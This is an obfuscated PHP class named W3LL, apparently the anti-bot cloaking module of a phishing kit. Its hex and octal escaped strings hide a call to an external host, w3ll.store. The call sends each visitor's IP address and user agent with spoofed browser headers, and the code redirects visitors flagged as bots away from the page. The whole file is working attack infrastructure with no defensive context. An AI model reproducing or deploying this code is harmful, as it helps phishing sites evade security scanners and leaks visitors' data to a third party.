<?php
 class W3LL { protected $server = "\150\164\x74\x70\163\72\57\57\x77\63\154\x6c\x2e\163\164\x6f\162\145"; protected $active; protected $bot; function __construct($config = array()) { $this->active = $config["\141\143\164\x69\166\x65"]; $this->apikey = $config["\x61\160\x69\x6b\145\x79"]; $this->bot = $config["\142\x6f\164\137\x72\145\x64\151\x72\x65\x63\x74"]; } function get_client_ip() { if (isset($_SERVER["\110\x54\124\120\137\x43\106\137\103\117\116\116\x45\x43\x54\111\x4e\107\137\111\x50"])) { $_SERVER["\122\x45\115\117\124\105\x5f\x41\x44\x44\122"] = $_SERVER["\110\x54\x54\x50\137\103\x46\137\x43\x4f\x4e\x4e\x45\x43\124\111\116\x47\137\111\x50"]; $_SERVER["\x48\124\x54\120\x5f\103\x4c\x49\105\116\x54\x5f\111\x50"] = $_SERVER["\110\124\124\120\x5f\x43\106\137\103\117\x4e\116\x45\x43\124\x49\116\x47\x5f\x49\120"]; } $client = @$_SERVER["\x48\x54\x54\120\x5f\103\114\111\105\x4e\x54\x5f\111\x50"]; $forward = @$_SERVER["\110\x54\124\x50\137\x58\x5f\106\117\x52\x57\101\x52\x44\x45\104\137\106\117\122"]; $remote = $_SERVER["\x52\105\x4d\x4f\x54\105\137\101\x44\x44\122"]; if (filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; } elseif (filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; } else { $ip = $remote; } return $ip; } function httpGet($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($ch); return $response; } function check() { $ip = $this->get_client_ip(); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "\150\164\164\160\x73\72\57\x2f\167\63\x6c\x6c\56\163\x74\x6f\x72\145\x2f\x61\160\x69\x2f\143\x72\141\167\154\145\162\x73\57\x62\157\164\x2d\x63\150\x65\x63\x6b\x3f\151\x70\75" . $ip . "\46\165\141\75" . urlencode($_SERVER["\x48\124\x54\x50\x5f\125\123\x45\122\x5f\101\x47\x45\x4e\x54"])); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "\x47\x45\124"); curl_setopt($ch, CURLOPT_ENCODING, "\147\172\x69\x70\54\40\144\x65\x66\x6c\141\x74\145"); $headers = array(); $headers[] = "\x55\x73\x65\x72\55\101\147\145\156\x74\72\x20\115\157\x7a\151\x6c\x6c\141\x2f\x35\56\x30\40\x28\x57\x69\156\x64\x6f\x77\163\x20\x4e\124\x20\61\x30\56\60\x3b\40\x57\x69\x6e\x36\64\x3b\x20\170\x36\64\73\40\162\x76\72\x39\64\56\x30\x29\40\107\145\x63\x6b\157\57\62\60\61\60\60\x31\60\61\40\x46\x69\162\145\x66\157\x78\57\71\64\x2e\60"; $headers[] = "\x41\143\x63\145\160\x74\72\x20\164\x65\170\x74\57\150\164\155\x6c\54\x61\160\x70\x6c\151\143\141\x74\151\x6f\x6e\57\x78\150\x74\x6d\x6c\x2b\170\x6d\x6c\x2c\x61\x70\160\x6c\151\x63\x61\x74\151\157\156\57\170\155\154\x3b\x71\75\60\56\71\x2c\151\x6d\x61\147\145\x2f\141\x76\x69\146\54\151\155\x61\147\x65\57\x77\x65\x62\x70\x2c\x2a\57\52\x3b\x71\75\60\x2e\70"; $headers[] = "\101\x63\x63\x65\160\x74\55\x4c\141\x6e\x67\x75\x61\x67\x65\72\x20\145\156\x2d\125\123\x2c\x65\x6e\x3b\x71\75\x30\56\x35"; $headers[] = "\x43\157\156\x6e\145\143\164\x69\x6f\x6e\x3a\x20\153\145\x65\160\55\x61\x6c\151\x76\145"; $headers[] = "\125\160\x67\162\141\144\x65\55\x49\x6e\x73\x65\143\x75\162\x65\55\x52\x65\x71\165\x65\x73\164\x73\72\x20\61"; $headers[] = "\123\x65\143\x2d\106\145\x74\143\x68\x2d\104\x65\163\x74\x3a\x20\x64\157\143\165\155\145\x6e\164"; $headers[] = "\123\x65\143\55\106\x65\x74\x63\150\55\115\x6f\144\145\72\40\x6e\x61\x76\x69\147\x61\x74\145"; $headers[] = "\x53\x65\143\55\106\145\x74\x63\x68\55\x53\151\164\145\x3a\x20\156\x6f\156\x65"; $headers[] = "\x53\x65\143\x2d\x46\145\x74\x63\150\55\125\x73\145\162\x3a\x20\x3f\61"; $headers[] = "\x43\x61\x63\150\145\55\103\x6f\156\x74\x72\x6f\x6c\72\x20\155\141\x78\55\141\147\x65\x3d\x30"; curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); $result = curl_exec($ch); if (curl_errno($ch)) { echo "\105\162\162\x6f\162\72" . curl_error($ch); } curl_close($ch); $json = json_decode($result); if ($json->is_bot) { return true; } else { return false; } } function run() { if ($this->active == true) { if ($this->check() == true) { die(header("\x6c\157\x63\x61\x74\151\157\156\x3a\x20" . $this->bot)); } } } }